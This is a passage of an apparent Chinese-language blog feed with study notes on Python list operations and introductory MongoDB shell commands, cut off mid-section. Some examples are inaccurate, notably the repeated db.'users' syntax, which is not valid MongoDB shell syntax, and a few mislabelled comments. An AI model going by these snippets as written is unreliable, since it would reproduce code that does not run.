 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">x[<span class="number">3</span>:] = [<span class="string">&#x27;Hello 1&#x27;</span>, <span class="string">&#x27;Hello 2&#x27;</span>]      <span class="comment"># [1, 2, 3, &#x27;Hello 1&#x27;, &#x27;Hello 2&#x27;]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>在不知道某個元素的索引值時替換為新元素</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">x[x.index(<span class="number">4</span>)] = <span class="string">&#x27;Hello 1&#x27;</span>           <span class="comment"># [1, 2, 3, &#x27;Hello 1&#x27;, 5]</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="查找-Search"><a href="#查找-Search" class="headerlink" title="查找 Search"></a>查找 Search</h3><ol>
<li><p><code>count()</code>方法：查找某個元素出現的次數</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">9</span>, <span class="number">8</span>, <span class="string">&#x27;Hello 1&#x27;</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="string">&#x27;Hello 1&#x27;</span>]</span><br><span class="line">x.count(<span class="number">3</span>)          <span class="comment"># 3</span></span><br><span class="line">x.count(<span class="string">&#x27;Hello 1&#x27;</span>)  <span class="comment"># 2</span></span><br><span class="line">x.count(<span class="number">4</span>)          <span class="comment"># 0</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>index()</code>方法：查找某個元素的索引值</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">9</span>, <span class="number">8</span>, <span class="string">&#x27;Hello 1&#x27;</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="string">&#x27;Hello 1&#x27;</span>]</span><br><span class="line">x.index(<span class="number">5</span>)          <span class="comment"># 4</span></span><br><span class="line">x.index(<span class="string">&#x27;Hello 1&#x27;</span>)  <span class="comment"># 2</span></span><br></pre></td></tr></table></figure>
<ul>
<li>如果列表中存在多個匹配的元素，則只會刪除第一個</li>
<li>如果指定的元素不存在則報錯</li>
</ul>
</li>
<li><p><code>index(x, start, end)</code>：可選參數，指定查找的開始與結束位置</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">9</span>, <span class="number">8</span>, <span class="string">&#x27;Hello 1&#x27;</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="string">&#x27;Hello 1&#x27;</span>]</span><br><span class="line">x.index(<span class="number">3</span>, <span class="number">4</span>, <span class="number">8</span>)        <span class="comment"># 5</span></span><br><span class="line">x.index(<span class="string">&#x27;Hello 1&#x27;</span>, <span class="number">3</span>)   <span class="comment"># 8</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h3><ol>
<li><p><code>sort()</code>方法：對列表進行排序（倒序）</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">5</span>]</span><br><span class="line">x.sort()        <span class="comment"># [1, 2, 3, 3, 4, 5, 6, 9]</span></span><br><span class="line">x.sort(reverse = <span class="literal">True</span>)      <span class="comment"># [9, 6, 5, 4, 3, 3, 2, 1]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>reverse()</code>方法：反轉列表</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">5</span>]</span><br><span class="line">x.reverse()     <span class="comment"># [5, 3, 9, 2, 6, 4, 1, 3]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>copy()</code>方法：複製列表</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">5</span>]</span><br><span class="line">y = x.copy()    <span class="comment"># y = [3, 1, 4, 6, 2, 9, 3, 5]</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="列表的加與乘"><a href="#列表的加與乘" class="headerlink" title="列表的加與乘"></a>列表的加與乘</h2><ol>
<li><p>加法：</p>
<ul>
<li>對兩個列表進行拼接  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">y = [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">z = x + y   <span class="comment"># z = [1, 2, 3, 4, 5, 6]</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>乘法：</p>
<ul>
<li>重複列表裡面所有元素若干次  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">z = x * <span class="number">2</span>   <span class="comment"># z = [1, 2, 3, 1, 2, 3]</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="嵌套列表"><a href="#嵌套列表" class="headerlink" title="嵌套列表"></a>嵌套列表</h2><ol>
<li><p>創建嵌套列表：</p>
<ul>
<li>創建二維列表  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">matrix = [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>], [<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]]</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>訪問嵌套列表：</p>
<ul>
<li><p>遍歷二維列表：</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> matrix:</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> i:</span><br><span class="line">        <span class="built_in">print</span>(item, end = <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">        <span class="comment"># 1 2 3 </span></span><br><span class="line">        <span class="comment"># 4 5 6 </span></span><br><span class="line">        <span class="comment"># 7 8 9 </span></span><br></pre></td></tr></table></figure>
</li>
<li><p>使用下標訪問：</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">matrix[<span class="number">1</span>]       <span class="comment"># [4, 5, 6]</span></span><br><span class="line">matrix[<span class="number">1</span>][<span class="number">2</span>]    <span class="comment"># 6</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="列表拷貝"><a href="#列表拷貝" class="headerlink" title="列表拷貝"></a>列表拷貝</h2><h3 id="列表淺拷貝方法"><a href="#列表淺拷貝方法" class="headerlink" title="列表淺拷貝方法"></a>列表淺拷貝方法</h3><ol>
<li><p><code>=</code>方式：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">y = x</span><br><span class="line">x[<span class="number">2</span>] = <span class="number">0</span>    <span class="comment"># y = [1, 2, 0, 4]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>copy()</code>方法：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">y = x.copy()</span><br><span class="line">x [<span class="number">2</span>] = <span class="number">0</span>       <span class="comment"># y = [1, 2, 3, 4]</span></span><br><span class="line"></span><br><span class="line">x = [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>], [<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]]</span><br><span class="line">y = x.copy()</span><br><span class="line">x [<span class="number">1</span>][<span class="number">1</span>] = <span class="number">2</span>    <span class="comment"># y = [[1, 2, 3], [4, 2, 6], [7, 8, 9]]</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>copy()</code>方法在嵌套列表中也只是淺拷貝</li>
</ul>
</li>
</ol>
<h3 id="嵌套列表問題"><a href="#嵌套列表問題" class="headerlink" title="嵌套列表問題"></a>嵌套列表問題</h3><ul>
<li>快速創建二維列表  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">A = [<span class="number">0</span>] * <span class="number">3</span>             <span class="comment"># 0 0 0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):      <span class="comment"># 0 0 0</span></span><br><span class="line">    A[i] = [<span class="number">0</span>] * <span class="number">3</span>      <span class="comment"># 0 0 0</span></span><br><span class="line"></span><br><span class="line">A[<span class="number">0</span>] <span class="keyword">is</span> A[<span class="number">1</span>]    <span class="comment"># False</span></span><br><span class="line">A[<span class="number">1</span>] <span class="keyword">is</span> A[<span class="number">2</span>]    <span class="comment"># False</span></span><br><span class="line"></span><br><span class="line">A[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">1</span>     <span class="comment"># 0 0 0</span></span><br><span class="line">                <span class="comment"># 0 1 0</span></span><br><span class="line">                <span class="comment"># 0 0 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 嵌套列表拷貝問題 #</span></span><br><span class="line">B = [[<span class="number">0</span>] * <span class="number">3</span>] * <span class="number">3</span>   <span class="comment"># 0 0 0</span></span><br><span class="line">                    <span class="comment"># 0 1 0</span></span><br><span class="line">                    <span class="comment"># 0 0 0</span></span><br><span class="line">    </span><br><span class="line">B[<span class="number">0</span>] <span class="keyword">is</span> B[<span class="number">1</span>]    <span class="comment"># True</span></span><br><span class="line">B[<span class="number">1</span>] <span class="keyword">is</span> B[<span class="number">2</span>]    <span class="comment"># True</span></span><br><span class="line"></span><br><span class="line">B[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">1</span>     <span class="comment"># 0 1 0</span></span><br><span class="line">                <span class="comment"># 0 1 0</span></span><br><span class="line">                <span class="comment"># 0 1 0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>由於<code>[[...]] * 3</code>的複製只是複製嵌套在內列表的地址值</li>
</ul>
</li>
</ul>
<h3 id="copy模塊"><a href="#copy模塊" class="headerlink" title="copy模塊"></a>copy模塊</h3><ul>
<li><p><code>copy.copy()</code>方法：實現淺拷貝</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> copy</span><br><span class="line">x = [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>], [<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]]</span><br><span class="line">y = copy.copy(x)</span><br><span class="line">x[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">0</span>     <span class="comment"># y = [[1, 2, 3], [4, 0, 6], [7, 8, 9]]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>copy.deepcopy()</code>方法：實現深拷貝</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> copy</span><br><span class="line">x = [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>], [<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]]</span><br><span class="line">y = copy.deepcopy(x)</span><br><span class="line">x[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">0</span>     <span class="comment"># y = [[1, 2, 3], [4, 5, 6], [7, 8, 9]]</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="列表推導式"><a href="#列表推導式" class="headerlink" title="列表推導式"></a>列表推導式</h2><h3 id="基本語法"><a href="#基本語法" class="headerlink" title="基本語法"></a>基本語法</h3><ul>
<li><code>[expression for target in iterable]</code></li>
<li><code>for target in iterable</code> - 獲得列表的每一個元素</li>
<li><code>expression</code> - 表達式，對每一個元素統一進行修改</li>
<li>具體編碼：  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">x = [i * <span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> x]      <span class="comment"># [2, 4, 6, 8, 10]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">    x[i] *= <span class="number">2</span>               <span class="comment"># [2, 4, 6, 8, 10]</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="其他範例"><a href="#其他範例" class="headerlink" title="其他範例"></a>其他範例</h3><ol>
<li><p>將字符串的字符轉為<code>Unicode</code>編碼並存儲到列表</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="built_in">ord</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&#x27;Hello&#x27;</span>]     <span class="comment"># [72, 101, 108, 108, 111]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>提取二維列表中第二列(second column)的元素</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">matrix = [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>], [<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]]</span><br><span class="line">sec_col = [row[<span class="number">1</span>] <span class="keyword">for</span> row <span class="keyword">in</span> matrix]    <span class="comment"># [2, 5, 8]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>提取二維列表中對角線上的元素</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">matrix = [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>], [<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]]</span><br><span class="line">diag1 = [matrix[i][i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(matrix))]   <span class="comment"># [1, 5, 9]</span></span><br><span class="line">diag2 = [matrix[i][(<span class="built_in">len</span>(matrix) - <span class="number">1</span>) - i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(matrix))]   <span class="comment"># [3, 5, 7]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>列表推導式創建列表</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">S = [[<span class="number">0</span>] * <span class="number">3</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">S[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">1</span>     <span class="comment"># 0 0 0</span></span><br><span class="line">                <span class="comment"># 0 1 0</span></span><br><span class="line">                <span class="comment"># 0 0 0</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="列表推導式條件語句"><a href="#列表推導式條件語句" class="headerlink" title="列表推導式條件語句"></a>列表推導式條件語句</h3><ul>
<li><code>[expression for target in iterable if condition]</code></li>
<li><code>if condition</code> - 用於篩選的條件語句</li>
<li>具體編碼：  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]</span><br><span class="line">even = [i <span class="keyword">for</span> i <span class="keyword">in</span> x <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>]     <span class="comment"># [2, 4, 6, 8, 10]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = [<span class="string">&#x27;Donald&#x27;</span>, <span class="string">&#x27;Tina&#x27;</span>, <span class="string">&#x27;John&#x27;</span>, <span class="string">&#x27;Tony&#x27;</span>, <span class="string">&#x27;May&#x27;</span>, <span class="string">&#x27;Tom&#x27;</span>]</span><br><span class="line">t = [name <span class="keyword">for</span> name <span class="keyword">in</span> <span class="built_in">str</span> <span class="keyword">if</span> name[<span class="number">0</span>] == <span class="string">&#x27;T&#x27;</span>]    <span class="comment"># [&#x27;Tina&#x27;, &#x27;Tony&#x27;, &#x27;Tom&#x27;]</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="嵌套的列表推導式"><a href="#嵌套的列表推導式" class="headerlink" title="嵌套的列表推導式"></a>嵌套的列表推導式</h3><ul>
<li><p>語法：</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[expression <span class="keyword">for</span> target1 <span class="keyword">in</span> iterable1</span><br><span class="line">            <span class="keyword">for</span> target2 <span class="keyword">in</span> iterable2</span><br><span class="line">                        ...         </span><br><span class="line">            <span class="keyword">for</span> targetN <span class="keyword">in</span> iterableN]</span><br></pre></td></tr></table></figure>
</li>
<li><p>將二維列表降級為一維列表：</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 列表推導式實現</span></span><br><span class="line">matrix = [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>], [<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]]</span><br><span class="line">flatten = [col <span class="keyword">for</span> row <span class="keyword">in</span> matrix <span class="keyword">for</span> col <span class="keyword">in</span> row]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 循環實現</span></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> matrix:</span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> row:</span><br><span class="line">        flatten.append(col)</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>NodeJS - MongoDB</title>
    <url>/myBlog/2022/08/05/2022/2022-8-5-NodeJS-MongoDB/</url>
    <content><![CDATA[<h1 id="MongoDB-交互"><a href="#MongoDB-交互" class="headerlink" title="MongoDB 交互"></a>MongoDB 交互</h1><h2 id="數據庫"><a href="#數據庫" class="headerlink" title="數據庫"></a>數據庫</h2><ol>
<li><p>關係型數據庫 (SQL)</p>
<ul>
<li><code>sql</code>語句增刪改查操作</li>
<li>保持事務的一致性</li>
</ul>
</li>
<li><p>非關係型數據庫 (No-SQL)</p>
<ul>
<li>不用<code>sql</code>語句</li>
<li>輕量、高效、自由</li>
</ul>
</li>
<li><p>數據庫概念：</p>
<table>
<thead>
<tr>
<th align="center">SQL術語</th>
<th align="center">MongoDB術語</th>
<th align="center">說明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">database</td>
<td align="center">database</td>
<td align="center">數據庫</td>
</tr>
<tr>
<td align="center">table</td>
<td align="center">collection</td>
<td align="center">數據庫表</td>
</tr>
<tr>
<td align="center">row</td>
<td align="center">document</td>
<td align="center">數據紀錄文檔</td>
</tr>
<tr>
<td align="center">column</td>
<td align="center">field</td>
<td align="center">數據字段</td>
</tr>
<tr>
<td align="center">index</td>
<td align="center">index</td>
<td align="center">索引</td>
</tr>
<tr>
<td align="center">table.joins</td>
<td align="center"></td>
<td align="center">表連結，MongoDB不支持</td>
</tr>
<tr>
<td align="center">primary key</td>
<td align="center">primary key</td>
<td align="center">主鍵，id</td>
</tr>
</tbody></table>
</li>
</ol>
<h2 id="MongoDB基本使用"><a href="#MongoDB基本使用" class="headerlink" title="MongoDB基本使用"></a>MongoDB基本使用</h2><h3 id="數據庫基本使用"><a href="#數據庫基本使用" class="headerlink" title="數據庫基本使用"></a>數據庫基本使用</h3><ol>
<li><p>啟動數據庫：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./mongod --dbpath <span class="string">&#x27;storage path&#x27;</span></span><br><span class="line">./mongo</span><br></pre></td></tr></table></figure>


</li>
<li><p>操作數據庫：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 1. 查詢當前數據庫</span></span><br><span class="line"><span class="keyword">show</span> dbs</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2. 查看當前數據庫</span></span><br><span class="line">db</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 3. 切換數據庫，沒有就創建</span></span><br><span class="line">use <span class="string">&#x27;collName&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 4. 插入集合</span></span><br><span class="line">db.createCollection(<span class="string">&#x27;users&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 5. 刪除數據庫</span></span><br><span class="line">db.dropDatabase()</span><br></pre></td></tr></table></figure>


</li>
<li><p>操作集合：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 1. 設置集合（最大儲存5M內容，最多存儲5000個文檔集合）</span></span><br><span class="line">db.createCollection(<span class="string">&#x27;users&#x27;</span>, &#123;size:<span class="number">5242880</span>, capped:<span class="literal">true</span>, max:<span class="number">5000</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2. 獲取指定名稱 (users) 的集合</span></span><br><span class="line">db.getCollection(<span class="string">&#x27;users&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 3. 獲取數據庫中的所有集合</span></span><br><span class="line">db.getCollectionNames()</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 4. 刪除 (users) 集合</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.<span class="keyword">drop</span>()</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="文檔的增刪改"><a href="#文檔的增刪改" class="headerlink" title="文檔的增刪改"></a>文檔的增刪改</h3><ol>
<li><p>添加：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 字段、字域都可以不一樣（自由）</span></span><br><span class="line"><span class="comment">-- 1. (users) 添加文檔</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.save(&#123;username:<span class="string">&#x27;Donald&#x27;</span>, age:<span class="number">18</span>&#125;)</span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.save(&#123;myName:<span class="string">&#x27;Donald&#x27;</span>, myAge:<span class="number">18</span>, gender:<span class="string">&#x27;M&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2. (users) 同時添加多個文檔</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.save([&#123;username:<span class="string">&#x27;May&#x27;</span>, age:<span class="number">19</span>&#125;, &#123;username:<span class="string">&#x27;John&#x27;</span>, age:<span class="number">20</span>&#125;])</span><br></pre></td></tr></table></figure>


</li>
<li><p>刪除：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 1. 刪除所有 myAge 屬性且值為 18 的文檔</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.remove(&#123;myAge:<span class="number">18</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2. 刪除所有文檔</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.remove(&#123;&#125;)</span><br></pre></td></tr></table></figure>


</li>
<li><p>修改：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 1. 將第一個有 username:&#x27;Donald&#x27; 的文檔替換為 &#123;age:200&#125; 這個文檔</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.<span class="keyword">update</span>(&#123;username:<span class="string">&#x27;Donald&#x27;</span>&#125;, &#123;age:<span class="number">200</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2. 只是修改屬性中對應的值</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.<span class="keyword">update</span>(&#123;username:<span class="string">&#x27;Donald&#x27;</span>&#125;, &#123;$<span class="keyword">set</span>:&#123;age:<span class="number">200</span>&#125;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 3. 將屬性中的值增加 10</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.<span class="keyword">update</span>(&#123;username:<span class="string">&#x27;Donald&#x27;</span>&#125;, &#123;$inc:&#123;age:<span class="number">10</span>&#125;&#125;)</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="文檔的查詢"><a href="#文檔的查詢" class="headerlink" title="文檔的查詢"></a>文檔的查詢</h3><ol>
<li><p>查詢：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 1. 查詢所有文檔</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find()</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2. 查詢含有該屬性的文檔</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find(&#123;username:<span class="string">&#x27;Donald&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure>


</li>
<li><p>查詢值：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 1. 值等於 22</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find(&#123;age:<span class="number">22</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2. 值大於 22</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find(&#123;age:&#123;$gt:<span class="number">22</span>&#125;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 3. 值小於 22</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find(&#123;age:&#123;$lt:<span class="number">22</span>&#125;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 4. 值大於等於 22</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find(&#123;age:&#123;$gte:<span class="number">22</span>&#125;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 5. 值小於等於 22</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find(&#123;age:&#123;$lte:<span class="number">22</span>&#125;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 6. 值大於等於 23 並 小於等於 26</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find(&#123;age:&#123;$gte:<span class="number">23</span>, $lte:<span class="number">26</span>&#125;&#125;)</span><br></pre></td></tr></table></figure>


</li>
<li><p>正則表達式查詢：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find(&#123;username:<span class="operator">/</span>a<span class="operator">/</span>&#125;)</span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find(&#123;username:<span class="operator">/</span><span class="operator">^</span>D<span class="operator">/</span>&#125;)</span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find(&#123;username:<span class="operator">/</span>d$<span class="operator">/</span>&#125;)</span><br></pre></td></tr></table></figure>


</li>
<li><p>查詢指定字段：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 只要 username 這個字段</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find(&#123;&#125;, &#123;username:<span class="number">1</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 只要 username 和 age 這個字段</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find(&#123;&#125;, &#123;username:<span class="number">1</span>, age:<span class="number">1</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 只要 username 而且不要顯示 __id</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find(&#123;&#125;, &#123;username:<span class="number">1</span>, _id:<span class="number">0</span>&#125;)</span><br></pre></td></tr></table></figure>


</li>
<li><p>排序顯示：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 1. 正序顯示</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find(&#123;&#125;).sort(&#123;age:<span class="number">1</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2. 倒序顯示</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find(&#123;&#125;).sort(&#123;age:<span class="number">-1</span>&#125;)</span><br></pre></td></tr></table></figure>


</li>
<li><p>查詢數據列位：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 一頁有 n 條數據，每一頁的查詢</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find().<span class="keyword">skip</span>((pageNum <span class="operator">-</span> <span class="number">1</span>) <span class="operator">*</span> n).limit(n)</span><br><span class="line"><span class="comment">-- 查詢第 2 頁的數據，每一頁有5條數據</span></span><br><span class="line">db.<span class="string">&#x27;users&#x27;</span>.find().<span class="keyword">skip</span>((<span class="number">2</span><span class="number">-1</span>)<span class="operator">*</span><span class="number">5</span>).limit(<span class="number">5</span>)</span><br></pre></td></tr></table></figure>


</li>
<li><p><code>or</code>與查詢：</p>
